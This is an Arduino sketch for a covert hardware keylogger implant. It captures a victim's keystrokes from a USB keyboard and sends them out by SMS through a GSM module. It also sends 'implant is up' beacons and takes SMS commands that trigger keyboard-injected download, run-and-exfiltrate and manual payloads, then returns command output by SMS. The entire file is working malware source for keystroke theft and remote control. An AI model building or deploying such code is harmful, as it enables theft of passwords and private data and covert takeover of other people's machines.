
/* NOTE: Make sure to edit SoftwareSerial.h to change 
 *  #define _SS_MAX_RX_BUFF 64 // RX buffer size
 *  to
 *  #define _SS_MAX_RX_BUFF 256 // RX buffer size
 *
 * You need to set your info in globals.h
*/
#include <SoftwareSerial.h>
#include <Keyboard.h>
#include "C_USBhost.h"
#include "Payloads.h"
#include "utils.h"
#include "globals.h"

#ifdef DEBUG
C_USBhost USBhost = C_USBhost(Serial1, 1);
#else
C_USBhost USBhost = C_USBhost(Serial1, 0);
#endif
SoftwareSerial SMSSERIAL(8, 9);

unsigned long previousMillis = 0;
unsigned long previousMillisBeacon = 0;

#ifdef DEBUG
  unsigned long interval = 3000;
#else
  unsigned long interval = 60000;
#endif
byte captured_key;
bool pendingSMS = false;
String buffer_keystrokes = "";
unsigned int pendingLength = 0;

void setup(){
  delay(300);                                              
  Serial.begin(BAUD_RATE_SERIAL);

  Keyboard.begin();

#ifndef DEBUGWITHOUTSIM
  SMSSERIAL.begin(BAUD_RATE_SIM800L);
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
  SMSSERIAL.write("AT\r\n");
  readResponse();

  // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
  SMSSERIAL.write("AT+CMGF=1\r\n");
  readResponse();

#ifdef DEBUG
  collectDebugInfo();
#endif

#endif //DEBUGWITHOUTSIM                                        
}

void loop(){  
  unsigned long currentMillis = millis();
  captured_key = USBhost.GetKey();    

  // Send a beacon so we know that the implant is up
  // ToDo: this can infere with payloads execution. Use only when user is not typing
  if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
      String msg = "Beacon - ";
      msg += IMPLANT_NAME;
#ifdef DEBUG
      Serial.println("Sending beacon");
#endif
      sendSMSMessage(msg);
      previousMillisBeacon = currentMillis;
  }

  //Normalkey capture
  if(captured_key){
    if(captured_key == 8){ // Backspace
      if(buffer_keystrokes.length() > 0){
        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
      }
    }
    else{
      buffer_keystrokes += (char)captured_key;
    }
    previousMillis = currentMillis;  
  }

  //SMS send
  if (buffer_keystrokes.length() >= CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5){
    if (!pendingSMS){
      // The buffer could hold a lot of characters from previous SMS that couldn't be sent
      String bufferToSend = "";
      if (buffer_keystrokes.length() < CHAR_LIMIT - 1){
        bufferToSend = buffer_keystrokes;
      }
      else{
        bufferToSend = buffer_keystrokes.substring(0, CHAR_LIMIT - 1);
      }
#ifdef DEBUG
      Serial.println("Trying to send message with content: " + bufferToSend);
#endif
      
      sendSMSMessage(bufferToSend);
      pendingSMS = true;
      pendingLength = bufferToSend.length();
    } 
    else{
#ifdef DEBUG
      Serial.println("There is a SMS pending to be sent...");
#endif
    }
  }

  // If there is a pending SMS we check if it was sent, if so we remove the characters sent
  if (pendingSMS){
    if (SMSSERIAL.available()){
      String res = SMSSERIAL.readString();
#ifdef DEBUG
      Serial.println("Message read from SMSSERIAL: " + res);
#endif
      if (res.indexOf("CMGS: ") > 0){
#ifdef DEBUG
        Serial.println("SMS message succesfully sent");
#endif
        pendingSMS = false;
        
        SMSSerialFlush(); // just is case there is something else in the serial
        
        // We removed from the buffer the characters that were sent
        buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
      }
      // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
      else if (res.indexOf("ERROR: ")){
        // The SMS couldn't be sent, we need to retry
#ifdef DEBUG
        Serial.println("Trying to send message with content: " + buffer_keystrokes.substring(0, pendingLength));
#endif
        sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
      }
    }
  }

#ifdef DEBUGWITHOUTSIM
  if (true) {
#else
  //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
  if (!pendingSMS && SMSSERIAL.available()){
#endif

#ifdef DEBUG
    Serial.println("new SMS");
#endif

    String SMS = SMSSERIAL.readString();      
#ifdef DEBUGWITHOUTSIM
    //We wait a little bit so the OS has time to identify the keyboard
    delay(30000);
    // To simulate a real SMS:
    SMS = "+CMT: blablabla\r\n";
    SMS += DEBUGWITHOUTSIM_PAYLOAD;
#endif

    if(SMS.indexOf("+CMT: ") > -1){ // We got a command
      String SMS_text;
      // Code to remove last new line if exists
      if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
        SMS.remove(SMS.length()-1, SMS.length());
      }
      int new_line_pos = SMS.indexOf("\r\n", 2);
      SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
#ifdef DEBUG
      Serial.println("Received SMS with content:");
      Serial.println(SMS_text);
#endif
      String payload = getValue(SMS_text, SEPARATOR, 0);
  
#ifdef DEBUG
      if(payload.length() > 0){
        Serial.println("Got payload: " + payload);
      }
#endif
      
      if (payload == "UnlockDownload"){
        unlockDownload(SMS_text);
      }
      else if(payload == "UnlockRunAndExfil"){
        unlockRunAndExfil(SMS_text);
      }
      else if(payload == "Manual"){
        manualPayload(SMS_text);
      }
      else{
  #ifdef DEBUG
        Serial.println("Unknown payload " + payload); 
  #endif
        sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
      }
      // After execute a fake payload it does a sleep
#ifdef DEBUGWITHOUTSIM
      delay(30000);
#endif
    }
    else {
#ifdef DEBUG
      Serial.println("Receive something that is not an SMS: " + SMS);
#endif
    }
  }

  // If there is anything to read from the serial port we forward it via SMSs 
  // This is used to exfil the result of commands
  if (Serial.available()) {
    String output = Serial.readString();
    sendSMSMessage("Ex: " + output);
  }
}
